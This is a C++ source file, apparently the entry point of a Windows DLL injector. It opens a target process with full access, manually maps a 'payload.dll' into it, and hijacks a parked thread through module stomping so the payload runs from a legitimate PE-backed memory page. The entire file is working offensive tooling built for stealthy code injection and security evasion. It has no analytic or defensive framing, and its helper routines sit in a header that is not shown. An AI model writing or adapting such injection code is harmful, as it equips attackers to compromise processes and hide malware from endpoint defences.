#include "src/Injector.h"

int main()
{
    auto pid = Find_Process(Injector_Target);
    if (!pid)
    {
        ERR("find_process failed — is the target running?");
        return 1;
    }

    DBG("target pid=%lu", *pid);

    Unique_Handle proc{ OpenProcess(PROCESS_ALL_ACCESS, FALSE, *pid) };
    if (!proc)
    {
        ERR("OpenProcess PROCESS_ALL_ACCESS failed — run as admin?");
        return 1;
    }

    DBG("process handle ok");

    auto dll_path = Exe_Dir_Path(Module_Name);
    if (!dll_path)
    {
        ERR("exe_dir_path failed");
        return 1;
    }

    DBG("dll path: %s", dll_path->c_str());

    auto dll_bytes = Read_File(*dll_path);
    if (!dll_bytes)
    {
        ERR("read_file failed — is payload.dll beside the exe?");
        return 1;
    }

    DBG("dll size: %zu bytes", dll_bytes->size());

    auto mapped = Manual_Map(proc.get(), *dll_bytes);
    if (!mapped)
    {
        DBG("manual_map failed");
        return 1;
    }

    DBG("mapped: image_base=%llx entry=%llx",
        (unsigned long long)mapped->Image_Base,
        (unsigned long long)mapped->Entry_Point);

    auto tid = Find_Parked_Thread(*pid);
    if (!tid)
    {
        DBG("find_parked_thread failed — no suitable thread found");
        return 1;
    }

    DBG("parked thread tid=%lu", *tid);

    std::optional<uintptr_t> stomped;
    for (auto& candidate : Modules_Available)
    {
        DBG("trying stomp+hijack via %.*ls", (int)candidate.size(), candidate.data());
        stomped = Stomp_And_Hijack(proc.get(), *pid, *tid, candidate, mapped->Image_Base, mapped->Entry_Point);
        if (stomped)
        {
            break;
        }
    }

    if (!stomped)
    {
        DBG("stomp_and_hijack failed on all candidates");
        return 1;
    }

    DBG("done — payload dispatched from PE-backed page tail %llx", (unsigned long long) * stomped);
    return 0;
}